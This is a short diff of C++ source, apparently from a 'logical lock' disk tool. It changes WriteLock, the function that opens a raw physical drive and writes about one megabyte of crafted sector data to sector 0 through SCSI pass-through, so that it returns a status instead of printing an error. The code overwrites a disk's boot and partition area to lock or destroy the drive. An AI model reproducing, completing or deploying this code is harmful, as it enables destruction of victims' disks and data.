@@ -1,4 +1,3 @@
-#include"Lock.h"
 #include"DiskOperation.h"
 void WriteDiskThread(LPCWSTR disk) {
 	HANDLE drv = CreateFileW(disk, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
@@ -93,9 +92,9 @@ unsigned char data_b[512] = {
 
 unsigned char data_main[1024000] = { 0 };
 
-void WriteLock(HANDLE drive) {//写入逻辑锁数据
+BOOL WriteLock(HANDLE drive) {//写入逻辑锁数据
 	if (drive == INVALID_HANDLE_VALUE)
-		cout << "无效句柄" << endl;
+		return 0;
 
 	for (int i = 0; i <= 511; i++) {
 		data_main[i] = data_a[i];
@@ -110,7 +109,7 @@ void WriteLock(HANDLE drive) {//写入逻辑锁数据
 	}
 	DWORD wb;
 	//WriteFile(drive, data_main, 1024000, &wb, NULL);
-	SCSISectorIO(drive, 0, data_main, 1024000, SCSI_W);
+	return SCSISectorIO(drive, 0, data_main, 1024000, SCSI_W);
 	CloseHandle(drive);
 }
 LPCWSTR CharToLPCWSTR(const char* charString) {
